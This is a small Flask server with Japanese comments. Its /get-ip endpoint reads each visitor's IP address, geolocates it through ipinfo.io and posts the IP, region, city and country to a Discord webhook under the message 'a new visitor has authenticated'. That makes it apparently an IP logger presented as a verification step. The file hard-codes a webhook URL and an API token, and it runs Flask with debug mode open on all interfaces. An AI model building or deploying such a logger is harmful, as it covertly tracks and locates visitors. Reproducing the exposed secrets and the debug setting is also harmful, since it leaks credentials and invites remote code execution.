from flask import Flask, jsonify, request
import requests
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1352149625905352776/kHe96xlEGu9WbbhNy1yUDrRFjt9m0C7aEkVyUzS2arCOXuEh2QhJ9ZAkQ10OgmY_f6dY"

def get_client_ip():
    """リクエストヘッダーからクライアントのIPを取得"""
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    
    # X-Forwarded-Forに複数のIPがある場合、最初のIPを取得
    if user_ip and "," in user_ip:
        user_ip = user_ip.split(",")[0].strip()
    
    return user_ip

@app.route('/get-ip', methods=['GET'])
def get_ip():
    # クライアントのIPを取得
    user_ip = get_client_ip()

    # IP情報を取得（ipinfo.io API）
    access_token = "232da865392bdd"
    response = requests.get(f"https://ipinfo.io/{user_ip}/json?token={access_token}")
    
    if response.status_code == 200:
        data = response.json()
        region = data.get("region", "都道府県情報なし")
        city = data.get("city", "市区町村情報なし")
        country = data.get("country", "国情報なし")

        # Discord通知
        discord_message = {
            "content": f"🌍 **新しい訪問者が認証しました！**\n"
                       f"🔹 **IP:** {user_ip}\n"
                       f"📍 **地域:** {region}\n"
                       f"🏠 **市区町村:** {city}\n"
                       f"🗺️ **国:** {country}"
        }
        discord_response = requests.post(DISCORD_WEBHOOK_URL, json=discord_message)

        if discord_response.status_code != 204:
            print(f"⚠️ Discord送信エラー: {discord_response.status_code}, {discord_response.text}")

        return jsonify({"ip": user_ip, "region": region, "city": city, "country": country})

    return jsonify({"error": "認証に失敗しました"}), 500

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
